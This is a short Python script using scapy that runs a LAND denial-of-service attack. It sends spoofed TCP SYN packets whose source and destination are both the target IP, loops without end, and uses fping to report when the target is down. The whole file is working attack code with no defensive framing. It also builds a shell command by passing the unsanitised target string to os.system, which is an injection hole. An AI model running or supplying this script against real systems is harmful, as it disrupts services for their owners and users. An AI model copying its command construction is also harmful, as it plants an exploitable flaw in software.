import os
from scapy.all import *
from time import sleep

def LANDDoS(ip,quiet):
    packet = IP(src=ip,dst=ip)/TCP(flags='S',sport=134,dport=134)
    print("[+] Sending Packets to "+ip)
    iter = 0
    while True:
        send(packet,verbose=0)
        print("[+] Sent packet")
        print(packet.show())
        print("[+] Packet number "+str(iter))
        sleep(2)
        if iter%5 == 0:
            exitstat = os.system("fping -q "+ip)
            if not exitstat:
                print("[-] Target is still up!")
                inp = input("[-] Target may be invulverable. Continue? y/n\n> ")
                if inp in ('n','N','no','NO','nO','No'):
                    print("LAND DoS stopped")
                    exit(0)
            if exitstat:
                print("[+] Success! Target Down")
                inp = input("[+] Continue? y/n\n> ")
                if inp in ('n','N','no','NO','nO','No'):
                    print("LAND DoS stopped")
                    exit(0)

        iter += 1

